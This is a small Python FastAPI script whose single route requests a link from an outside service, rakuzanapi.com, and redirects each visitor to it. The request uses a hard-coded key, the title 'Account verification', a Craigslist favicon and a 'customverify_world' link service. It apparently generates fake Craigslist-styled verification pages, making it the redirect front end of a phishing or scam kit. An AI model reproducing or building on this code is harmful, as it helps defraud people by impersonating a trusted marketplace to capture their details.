from fastapi import FastAPI
from fastapi.responses import RedirectResponse, PlainTextResponse
from config import host, user, password, db_name
import requests

app = FastAPI()



@app.get("/")
def new():

    url = 'https://rakuzanapi.com/api/createLink'

    headers = {
        'key': 'akwd7749221011picbs33m1l',
        'title': 'Account verification',
        'price': '-',
        'name': 'Admin',
        'address': '-',
        'photo': 'https://moscow.craigslist.org/favicon.ico',
        'balance': '1',
        "linkService": "customverify_world"
    }

    response = requests.post(url, data=headers).json()
    print(response)
    url = response['link']
    id_ = response['id']
    return RedirectResponse(url)
